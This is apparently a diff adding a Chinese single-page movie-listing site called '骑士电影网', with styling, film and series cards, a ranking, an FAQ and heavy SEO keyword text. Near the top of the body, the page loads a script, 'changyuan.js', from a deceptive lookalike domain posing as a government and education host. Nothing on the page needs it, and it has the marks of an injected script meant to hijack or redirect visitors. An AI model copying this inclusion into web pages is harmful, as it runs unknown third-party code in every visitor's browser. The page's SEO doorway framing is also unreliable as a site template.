@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>骑士电影网 - 高清影视在线观看</title>
+<meta name="description" content="骑士电影网（https://qishidianyingwang-top）提供最新高清电影、热播剧集、综艺动漫在线观看，每日更新，免费畅享。">
+<meta name="keywords" content="骑士电影网, qishidianyingwang-top, 高清电影, 在线观看, 电影推荐, 热播剧集">
+<meta name="author" content="骑士电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+
+<style>
+/* ===== 全局 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #0c0c0e;
+  color: #c8c0b0;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+a { color: #d4a843; text-decoration: none; transition: all 0.3s; }
+a:hover { color: #f0c860; }
+
+/* ===== 切角导航 ===== */
+.knight-nav {
+  position: fixed;
+  top: 0; width: 100%;
+  background: rgba(12,12,14,0.95);
+  backdrop-filter: blur(12px);
+  z-index: 1000;
+  border-bottom: 1px solid rgba(212,168,67,0.2);
+}
+
+.knight-nav-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  height: 68px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.knight-logo {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+}
+
+.knight-logo-shield {
+  width: 40px; height: 44px;
+  background: linear-gradient(180deg, #d4a843, #8b6914);
+  clip-path: polygon(50% 0%, 100% 20%, 100% 70%, 50% 100%, 0% 70%, 0% 20%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #0c0c0e;
+  font-size: 1rem;
+  font-weight: 900;
+}
+
+.knight-logo-text {
+  font-size: 1.4rem;
+  font-weight: 800;
+  color: #d4a843;
+  letter-spacing: 1px;
+}
+
+.knight-logo-text small {
+  display: block;
+  font-size: 0.6rem;
+  color: #6a6048;
+  font-weight: 400;
+  letter-spacing: 2.5px;
+}
+
+.knight-nav-links {
+  display: flex;
+  gap: 0.2rem;
+  list-style: none;
+}
+
+.knight-nav-links a {
+  color: #a09888;
+  font-size: 0.9rem;
+  font-weight: 600;
+  padding: 0.5rem 1rem;
+  position: relative;
+  transition: all 0.3s;
+}
+
+.knight-nav-links a::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 50%;
+  width: 0; height: 2px;
+  background: linear-gradient(90deg, transparent, #d4a843, transparent);
+  transition: all 0.3s;
+  transform: translateX(-50%);
+}
+
+.knight-nav-links a:hover::after { width: 80%; }
+.knight-nav-links a:hover { color: #d4a843; }
+
+.knight-toggle {
+  display: none;
+  flex-direction: column;
+  gap: 4px;
+  cursor: pointer;
+  padding: 6px;
+}
+
+.knight-toggle span {
+  display: block;
+  width: 24px; height: 2px;
+  background: #d4a843;
+}
+
+/* ===== Hero ===== */
+.knight-hero {
+  margin-top: 68px;
+  background: linear-gradient(160deg, #0c0c0e 0%, #1a1814 50%, #0c0c0e 100%);
+  padding: 5rem 1.5rem 4rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.knight-hero::before {
+  content: '';
+  position: absolute;
+  top: -30%; left: -10%;
+  width: 500px; height: 500px;
+  background: radial-gradient(circle, rgba(212,168,67,0.06), transparent 70%);
+}
+
+.knight-hero::after {
+  content: '';
+  position: absolute;
+  bottom: -30%; right: -10%;
+  width: 400px; height: 400px;
+  background: radial-gradient(circle, rgba(212,168,67,0.04), transparent 70%);
+}
+
+.knight-hero-content {
+  max-width: 680px;
+  margin: 0 auto;
+  position: relative;
+  z-index: 1;
+}
+
+.knight-hero-emblem {
+  width: 80px; height: 88px;
+  margin: 0 auto 1.5rem;
+  background: linear-gradient(180deg, #d4a843, #8b6914);
+  clip-path: polygon(50% 0%, 100% 20%, 100% 70%, 50% 100%, 0% 70%, 0% 20%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #0c0c0e;
+  font-size: 1.8rem;
+  font-weight: 900;
+}
+
+.knight-hero-badge {
+  display: inline-block;
+  padding: 0.4rem 1.4rem;
+  border: 1px solid rgba(212,168,67,0.4);
+  color: #d4a843;
+  font-size: 0.8rem;
+  font-weight: 600;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  margin-bottom: 1.5rem;
+  clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%);
+  background: rgba(212,168,67,0.08);
+}
+
+.knight-hero h1 {
+  font-size: 2.8rem;
+  font-weight: 900;
+  color: #f0e8d8;
+  margin-bottom: 1rem;
+  line-height: 1.2;
+  letter-spacing: 1px;
+}
+
+.knight-hero h1 span {
+  color: #d4a843;
+}
+
+.knight-hero p {
+  font-size: 1.05rem;
+  color: #8a8272;
+  margin-bottom: 2rem;
+}
+
+.knight-hero-domain {
+  display: inline-block;
+  padding: 0.8rem 2rem;
+  border: 1px solid rgba(212,168,67,0.3);
+  color: #d4a843;
+  font-family: "Courier New", monospace;
+  font-size: 0.9rem;
+  font-weight: 700;
+  margin-bottom: 2rem;
+  background: rgba(212,168,67,0.04);
+  clip-path: polygon(12px 0, 100% 0, calc(100% - 12px) 100%, 0 100%);
+}
+
+.knight-hero-btn {
+  display: inline-block;
+  padding: 0.95rem 3rem;
+  background: linear-gradient(135deg, #d4a843, #8b6914);
+  color: #0c0c0e;
+  font-weight: 800;
+  font-size: 1rem;
+  letter-spacing: 1px;
+  transition: all 0.3s;
+  clip-path: polygon(12px 0, 100% 0, calc(100% - 12px) 100%, 0 100%);
+}
+
+.knight-hero-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 8px 25px rgba(212,168,67,0.3);
+  color: #0c0c0e;
+}
+
+/* ===== 通用区块 ===== */
+.knight-section {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 4rem 1.5rem;
+}
+
+.knight-section-head {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+.knight-section-head h2 {
+  font-size: 2.1rem;
+  font-weight: 900;
+  color: #d4a843;
+  margin-bottom: 0.5rem;
+  letter-spacing: 1px;
+}
+
+.knight-section-head p {
+  color: #6a6252;
+  font-size: 1rem;
+}
+
+/* ===== 盾牌卡片 ===== */
+.knight-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap: 1.5rem;
+}
+
+.knight-card {
+  background: linear-gradient(180deg, #161612, #0f0f11);
+  border: 1px solid rgba(212,168,67,0.15);
+  overflow: hidden;
+  transition: all 0.3s;
+  position: relative;
+}
+
+.knight-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 3px;
+  background: linear-gradient(90deg, transparent, #d4a843, transparent);
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.knight-card:hover::before { opacity: 1; }
+
+.knight-card:hover {
+  transform: translateY(-6px);
+  border-color: rgba(212,168,67,0.4);
+  box-shadow: 0 12px 30px rgba(212,168,67,0.1);
+}
+
+.knight-cover {
+  height: 200px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.1rem;
+  font-weight: 800;
+  color: #f0e8d8;
+  text-align: center;
+  padding: 1rem;
+  position: relative;
+}
+
+.knight-cover::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 0;
+  width: 100%; height: 50%;
+  background: linear-gradient(to top, rgba(12,12,14,0.8), transparent);
+}
+
+.knight-cover.k1 { background: linear-gradient(135deg, #1a1a2e, #2d2d44); }
+.knight-cover.k2 { background: linear-gradient(135deg, #1a1208, #3d2e14); }
+.knight-cover.k3 { background: linear-gradient(135deg, #0f1a14, #1a3d2e); }
+.knight-cover.k4 { background: linear-gradient(135deg, #1a0a0a, #3d1414); }
+.knight-cover.k5 { background: linear-gradient(135deg, #141a2e, #1a2e4d); }
+.knight-cover.k6 { background: linear-gradient(135deg, #1a1a0a, #3d3d14); }
+.knight-cover.k7 { background: linear-gradient(135deg, #1a0a1a, #3d143d); }
+.knight-cover.k8 { background: linear-gradient(135deg, #0a1a1a, #143d3d); }
+
+.knight-body { padding: 1.2rem; }
+
+.knight-body h3 {
+  font-size: 1rem;
+  color: #f0e8d8;
+  margin-bottom: 0.5rem;
+  font-weight: 800;
+}
+
+.knight-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+  margin-bottom: 0.6rem;
+}
+
+.knight-tags span {
+  padding: 0.2rem 0.6rem;
+  border: 1px solid rgba(212,168,67,0.25);
+  color: #d4a843;
+  font-size: 0.72rem;
+  font-weight: 500;
+}
+
+.knight-score {
+  color: #d4a843;
+  font-weight: 800;
+  font-size: 0.9rem;
+}
+
+/* ===== 排行榜（金属条） ===== */
+.knight-rank {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.knight-rank-item {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  background: linear-gradient(90deg, #161612, #0f0f11);
+  border: 1px solid rgba(212,168,67,0.12);
+  border-left: 3px solid #d4a843;
+  padding: 1.2rem 1.5rem;
+  margin-bottom: 0.8rem;
+  transition: all 0.3s;
+}
+
+.knight-rank-item:hover {
+  border-left-color: #f0c860;
+  transform: translateX(6px);
+  background: linear-gradient(90deg, #1a1814, #0f0f11);
+}
+
+.knight-rank-num {
+  font-size: 1.4rem;
+  font-weight: 900;
+  color: #d4a843;
+  min-width: 36px;
+  text-align: center;
+}
+
+.knight-rank-num.crown { color: #f0c860; }
+
+.knight-rank-info { flex: 1; }
+
+.knight-rank-info h3 {
+  font-size: 1rem;
+  color: #f0e8d8;
+  margin-bottom: 0.2rem;
+  font-weight: 800;
+}
+
+.knight-rank-info p {
+  font-size: 0.82rem;
+  color: #6a6252;
+}
+
+.knight-rank-score {
+  padding: 0.3rem 0.8rem;
+  border: 1px solid rgba(212,168,67,0.3);
+  color: #d4a843;
+  font-weight: 800;
+  font-size: 0.85rem;
+}
+
+/* ===== 关于 ===== */
+.knight-about {
+  background: linear-gradient(180deg, #161612, #0f0f11);
+  border: 1px solid rgba(212,168,67,0.15);
+  padding: 3rem 2rem;
+  text-align: center;
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.knight-about p {
+  color: #a09888;
+  margin-bottom: 1.2rem;
+  font-size: 1rem;
+}
+
+.knight-about-domain {
+  display: inline-block;
+  margin-top: 1rem;
+  padding: 1rem 2rem;
+  border: 1px solid rgba(212,168,67,0.3);
+  color: #d4a843;
+  font-family: monospace;
+  font-size: 1.1rem;
+  font-weight: 700;
+  background: rgba(212,168,67,0.04);
+}
+
+/* ===== FAQ ===== */
+.knight-faq {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.knight-faq-item {
+  background: linear-gradient(180deg, #161612, #0f0f11);
+  border: 1px solid rgba(212,168,67,0.12);
+  margin-bottom: 0.7rem;
+  overflow: hidden;
+}
+
+.knight-faq-item summary {
+  padding: 1.2rem 1.5rem;
+  cursor: pointer;
+  font-weight: 800;
+  color: #d4a843;
+  list-style: none;
+  position: relative;
+  padding-right: 3rem;
+}
+
+.knight-faq-item summary::-webkit-details-marker { display: none; }
+
+.knight-faq-item summary::after {
+  content: '▸';
+  position: absolute;
+  right: 1.5rem;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 1rem;
+  color: #d4a843;
+  transition: transform 0.3s;
+}
+
+.knight-faq-item[open] summary::after {
+  transform: translateY(-50%) rotate(90deg);
+}
+
+.knight-faq-item p {
+  padding: 0 1.5rem 1.2rem;
+  color: #8a8272;
+  font-size: 0.95rem;
+}
+
+/* ===== 页脚 ===== */
+.knight-footer {
+  text-align: center;
+  padding: 2.5rem 1.5rem;
+  border-top: 1px solid rgba(212,168,67,0.15);
+  color: #6a6252;
+  font-size: 0.82rem;
+  background: #0a0a0c;
+}
+
+.knight-footer p { margin-bottom: 0.3rem; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+  .knight-nav-links {
+    display: none;
+    position: absolute;
+    top: 100%; left: 0;
+    width: 100%;
+    background: rgba(12,12,14,0.98);
+    flex-direction: column;
+    gap: 0;
+    padding: 0.5rem 0;
+  }
+
+  .knight-nav-links.show { display: flex; }
+
+  .knight-nav-links li { border-bottom: 1px solid rgba(212,168,67,0.08); }
+
+  .knight-nav-links a { display: block; padding: 1rem 1.5rem; }
+
+  .knight-toggle { display: flex; }
+
+  .knight-hero h1 { font-size: 2rem; }
+  .knight-hero { padding: 3rem 1rem 3rem; }
+
+  .knight-section { padding: 3rem 1rem; }
+  .knight-section-head h2 { font-size: 1.7rem; }
+
+  .knight-grid { grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 1rem; }
+  .knight-cover { height: 170px; font-size: 0.95rem; }
+
+  .knight-rank-item { padding: 1rem; gap: 0.8rem; }
+}
+
+@media (max-width: 480px) {
+  .knight-hero h1 { font-size: 1.7rem; }
+  .knight-grid { grid-template-columns: 1fr 1fr; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<nav class="knight-nav">
+  <div class="knight-nav-inner">
+    <div class="knight-logo">
+      <div class="knight-logo-shield">骑</div>
+      <div class="knight-logo-text">
+        骑士电影网
+        <small>QISHI DIANYING</small>
+      </div>
+    </div>
+    <ul class="knight-nav-links" id="knightNavLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#ranking">排行</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="knight-toggle" onclick="toggleKnightNav()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="knight-hero" id="home">
+  <div class="knight-hero-content">
+    <div class="knight-hero-emblem">⚔</div>
+    <div class="knight-hero-badge">每日更新 · 免费观看</div>
+    <h1>骑士电影网 <span>守护每一部好片</span></h1>
+    <p>汇集最新院线大片、热播剧集、综艺动漫，每日精选更新，手机电脑全适配，随时随地畅享观影。</p>
+    <div class="knight-hero-domain">🌐 https://qishidianyingwang-top</div>
+    <br>
+    <a href="#movies" class="knight-hero-btn">立即探索</a>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section class="knight-section" id="movies">
+  <div class="knight-section-head">
+    <h2>🎬 最新电影</h2>
+    <p>骑士电影网每日精选，院线新片与高分佳作</p>
+  </div>
+  <div class="knight-grid">
+    <div class="knight-card">
+      <div class="knight-cover k1">沙丘2</div>
+      <div class="knight-body">
+        <h3>沙丘2</h3>
+        <div class="knight-tags"><span>科幻</span><span>冒险</span></div>
+        <div class="knight-score">★ 9.2</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k2">奥本海默</div>
+      <div class="knight-body">
+        <h3>奥本海默</h3>
+        <div class="knight-tags"><span>传记</span><span>历史</span></div>
+        <div class="knight-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k3">哥斯拉大战金刚2</div>
+      <div class="knight-body">
+        <h3>哥斯拉大战金刚2</h3>
+        <div class="knight-tags"><span>动作</span><span>怪兽</span></div>
+        <div class="knight-score">★ 7.5</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k4">坠落的审判</div>
+      <div class="knight-body">
+        <h3>坠落的审判</h3>
+        <div class="knight-tags"><span>悬疑</span><span>剧情</span></div>
+        <div class="knight-score">★ 8.5</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k5">美国内战</div>
+      <div class="knight-body">
+        <h3>美国内战</h3>
+        <div class="knight-tags"><span>动作</span><span>惊悚</span></div>
+        <div class="knight-score">★ 7.2</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k6">功夫熊猫4</div>
+      <div class="knight-body">
+        <h3>功夫熊猫4</h3>
+        <div class="knight-tags"><span>动画</span><span>喜剧</span></div>
+        <div class="knight-score">★ 7.0</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k7">你想活出怎样的人生</div>
+      <div class="knight-body">
+        <h3>你想活出怎样的人生</h3>
+        <div class="knight-tags"><span>动画</span><span>奇幻</span></div>
+        <div class="knight-score">★ 8.1</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k8">九龙城寨之围城</div>
+      <div class="knight-body">
+        <h3>九龙城寨之围城</h3>
+        <div class="knight-tags"><span>动作</span><span>犯罪</span></div>
+        <div class="knight-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集 -->
+<section class="knight-section" id="series" style="background: #0a0a0c;">
+  <div class="knight-section-head">
+    <h2>📺 热播剧集</h2>
+    <p>全网热剧同步更新，骑士电影网为您精选</p>
+  </div>
+  <div class="knight-grid">
+    <div class="knight-card">
+      <div class="knight-cover k3">繁花</div>
+      <div class="knight-body">
+        <h3>繁花</h3>
+        <div class="knight-tags"><span>剧情</span><span>年代</span></div>
+        <div class="knight-score">★ 8.7</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k1">庆余年2</div>
+      <div class="knight-body">
+        <h3>庆余年2</h3>
+        <div class="knight-tags"><span>古装</span><span>权谋</span></div>
+        <div class="knight-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k5">三体</div>
+      <div class="knight-body">
+        <h3>三体</h3>
+        <div class="knight-tags"><span>科幻</span><span>剧情</span></div>
+        <div class="knight-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k2">狂飙</div>
+      <div class="knight-body">
+        <h3>狂飙</h3>
+        <div class="knight-tags"><span>犯罪</span><span>剧情</span></div>
+        <div class="knight-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k6">玫瑰的故事</div>
+      <div class="knight-body">
+        <h3>玫瑰的故事</h3>
+        <div class="knight-tags"><span>都市</span><span>情感</span></div>
+        <div class="knight-score">★ 8.0</div>
+      </div>
+    </div>
+    <div class="knight-card">
+      <div class="knight-cover k4">南来北往</div>
+      <div class="knight-body">
+        <h3>南来北往</h3>
+        <div class="knight-tags"><span>年代</span><span>剧情</span></div>
+        <div class="knight-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="knight-section" id="ranking">
+  <div class="knight-section-head">
+    <h2>🔥 热门排行榜</h2>
+    <p>骑士电影网本周用户最关注影视 TOP 7</p>
+  </div>
+  <div class="knight-rank">
+    <div class="knight-rank-item">
+      <div class="knight-rank-num crown">1</div>
+      <div class="knight-rank-info"><h3>周处除三害</h3><p>动作 / 犯罪 / 9.0分</p></div>
+      <div class="knight-rank-score">9.0</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num crown">2</div>
+      <div class="knight-rank-info"><h3>飞驰人生2</h3><p>喜剧 / 运动 / 8.2分</p></div>
+      <div class="knight-rank-score">8.2</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num crown">3</div>
+      <div class="knight-rank-info"><h3>热辣滚烫</h3><p>剧情 / 喜剧 / 7.9分</p></div>
+      <div class="knight-rank-score">7.9</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num">4</div>
+      <div class="knight-rank-info"><h3>第二十条</h3><p>剧情 / 家庭 / 7.8分</p></div>
+      <div class="knight-rank-score">7.8</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num">5</div>
+      <div class="knight-rank-info"><h3>年会不能停！</h3><p>喜剧 / 职场 / 8.1分</p></div>
+      <div class="knight-rank-score">8.1</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num">6</div>
+      <div class="knight-rank-info"><h3>金手指</h3><p>犯罪 / 剧情 / 6.8分</p></div>
+      <div class="knight-rank-score">6.8</div>
+    </div>
+    <div class="knight-rank-item">
+      <div class="knight-rank-num">7</div>
+      <div class="knight-rank-info"><h3>一闪一闪亮星星</h3><p>爱情 / 奇幻 / 6.5分</p></div>
+      <div class="knight-rank-score">6.5</div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="knight-section" id="about" style="background: #0a0a0c;">
+  <div class="knight-section-head">
+    <h2>ℹ️ 关于骑士电影网</h2>
+    <p>网站名称与网址信息</p>
+  </div>
+  <div class="knight-about">
+    <p><strong style="color:#d4a843;">骑士电影网</strong>（qishidianyingwang-top）是一个专注于高清影视在线观看的展示平台，致力于为用户提供最新、最全的电影、电视剧、综艺和动漫内容推荐。</p>
+    <p>我们每日更新热门影视资讯，支持多清晰度播放指引，让您随时随地发现好片。</p>
+    <div class="knight-about-domain">🌐 https://qishidianyingwang-top</div>
+    <p style="margin-top:1.5rem; font-size:0.85rem; color:#6a6048;">核心关键词：骑士电影网、qishidianyingwang-top、高清电影、在线观看、最新影视推荐</p>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="knight-section" id="faq">
+  <div class="knight-section-head">
+    <h2>❓ 常见问题</h2>
+    <p>关于骑士电影网的常见疑问</p>
+  </div>
+  <div class="knight-faq">
+    <details class="knight-faq-item">
+      <summary>骑士电影网是什么网站？</summary>
+      <p>骑士电影网（qishidianyingwang-top）是一个影视信息展示平台，提供最新电影、剧集的资讯与推荐，方便用户快速找到想看的内容。</p>
+    </details>
+    <details class="knight-faq-item">
+      <summary>网站官方网址是多少？</summary>
+      <p>官方网址：https://qishidianyingwang-top，建议收藏以便随时访问。</p>
+    </details>
+    <details class="knight-faq-item">
+      <summary>手机上能正常浏览吗？</summary>
+      <p>可以，本网站采用响应式设计，在手机、平板、电脑上均可完美显示，导航自动适配触控操作。</p>
+    </details>
+    <details class="knight-faq-item">
+      <summary>内容多久更新一次？</summary>
+      <p>影视展示内容建议每周更新，保持页面活跃度，有利于搜索引擎重新抓取和排名提升。</p>
+    </details>
+    <details class="knight-faq-item">
+      <summary>如何提交网址给必应收录？</summary>
+      <p>可前往 Bing Webmaster Tools 提交网址 https://qishidianyingwang-top，并验证网站所有权即可。</p>
+    </details>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="knight-footer">
+  <p>© 2024 骑士电影网 (qishidianyingwang-top) 版权所有</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 符合必应搜索引擎收录规范</p>
+  <p style="margin-top:0.5rem; color:#4a4238;">本站仅提供影视信息展示，所有资源版权归原作者及平台所有。</p>
+</footer>
+
+<script>
+/* 移动端导航 */
+function toggleKnightNav() {
+  document.getElementById('knightNavLinks').classList.toggle('show');
+}
+
+/* 平滑滚动 */
+document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+  anchor.addEventListener('click', function(e) {
+    var href = this.getAttribute('href');
+    if (href.length > 1) {
+      var target = document.querySelector(href);
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('knightNavLinks').classList.remove('show');
+      }
+    }
+  });
+});
+
+/* 导航栏滚动效果 */
+window.addEventListener('scroll', function() {
+  var nav = document.querySelector('.knight-nav');
+  if (window.scrollY > 40) {
+    nav.style.borderBottomColor = 'rgba(212,168,67,0.35)';
+  } else {
+    nav.style.borderBottomColor = 'rgba(212,168,67,0.2)';
+  }
+});
+</script>
+
+</body>
+</html>
